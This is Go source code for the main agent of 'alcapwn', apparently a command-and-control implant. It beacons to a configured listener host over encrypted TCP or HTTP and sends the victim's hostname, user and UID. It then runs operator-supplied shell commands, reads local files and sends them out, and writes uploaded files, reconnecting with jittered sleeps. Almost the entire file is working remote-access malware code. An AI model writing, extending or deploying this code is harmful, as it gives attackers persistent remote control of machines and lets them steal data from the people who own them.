// Package main is the alcapwn agent binary.
//
// Build-time configuration is injected via -ldflags:
//
//	go build -ldflags "-s -w \
//	    -X main.lhost=10.0.0.1 \
//	    -X main.lport=4444 \
//	    -X main.interval=60 \
//	    -X main.jitter=20 \
//	    -X main.transport=tcp \
//	    -X main.serverFingerprint=<sha256-hex>" \
//	    ./agent/
//
// Supported transports:
//
//	tcp  — persistent X25519+AES-256-GCM encrypted TCP connection (default)
//	http — HTTP beacon polling: POST /register then GET|POST /beacon/{token}
//
// On any error the agent sleeps interval±jitter seconds and reconnects.
package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"

	"alcapwn/proto"
)

// Build-time variables — overridden with -ldflags at generate time.
var (
	lhost             = "127.0.0.1"
	lport             = "4444"
	interval          = "60"
	jitter            = "20"
	transport         = "tcp" // "tcp" or "http"
	serverFingerprint = ""    // leave empty to skip pinning (dev/test only)
)

const agentVersion = "v3"

func main() {
	h := buildHello()
	ivSec := parseInt(interval, 60)
	jitPct := parseInt(jitter, 20)

	for {
		t := buildTransport(ivSec, jitPct)
		if err := runWithTransport(t, h); err != nil && isDebug() {
			fmt.Fprintf(os.Stderr, "[alcapwn-agent] session error: %v\n", err)
		}
		t.Close()
		jitteredSleep(ivSec, jitPct)
	}
}

// buildTransport returns a Transport implementation for the configured transport var.
func buildTransport(ivSec, jitPct int) Transport {
	if transport == "http" {
		return newHTTPTransport(ivSec, jitPct)
	}
	return newTCPTransport()
}

// runWithTransport completes one full connect→task-loop cycle.
// Returns the first error that terminates the cycle.
func runWithTransport(t Transport, hello proto.Hello) error {
	if err := t.Connect(hello); err != nil {
		return err
	}
	for {
		task, err := t.PollTask()
		if err != nil {
			return err
		}
		res := executeTask(*task)
		if err := t.SendResult(res); err != nil {
			return err
		}
	}
}

// buildHello constructs the agent's identity payload sent on every connect.
func buildHello() proto.Hello {
	hostname, _ := os.Hostname()
	uid := ""
	username := ""
	if u, err := user.Current(); err == nil {
		uid = u.Uid
		username = u.Username
	}
	return proto.Hello{
		Version:   agentVersion,
		MachineID: machineID(),
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		User:      username,
		UID:       uid,
	}
}

// executeTask runs a single Task and returns its Result.
func executeTask(task proto.Task) proto.Result {
	res := proto.Result{TaskID: task.ID}

	switch task.Kind {
	case proto.TaskExec:
		out, err := runShell(task.Command)
		res.Output = out
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				res.Exit = ee.ExitCode()
			} else {
				res.Error = err.Error()
			}
		}

	case proto.TaskDownload:
		data, err := os.ReadFile(task.Path)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = data
		}

	case proto.TaskUpload:
		if err := os.WriteFile(task.Path, task.Data, 0644); err != nil {
			res.Error = err.Error()
		}

	default:
		res.Error = fmt.Sprintf("unknown task kind: %s", task.Kind)
	}

	return res
}

// runShell executes command via the system shell and returns combined output.
func runShell(command string) ([]byte, error) {
	shell := "/bin/sh"
	if sh := os.Getenv("SHELL"); sh != "" {
		shell = sh
	}
	return exec.Command(shell, "-c", command).CombinedOutput()
}

// jitteredSleep sleeps for intervalSec plus up to jitterPct% additional time.
func jitteredSleep(intervalSec, jitterPct int) {
	base := time.Duration(intervalSec) * time.Second
	if jitterPct > 0 {
		maxJitter := int64(float64(base) * float64(jitterPct) / 100.0)
		if maxJitter > 0 {
			base += time.Duration(rand.Int63n(maxJitter))
		}
	}
	time.Sleep(base)
}

func parseInt(s string, def int) int {
	var v int
	if n, _ := fmt.Sscan(s, &v); n == 1 && v > 0 {
		return v
	}
	return def
}

func isDebug() bool {
	return os.Getenv("ALCAPWN_DEBUG") == "1"
}
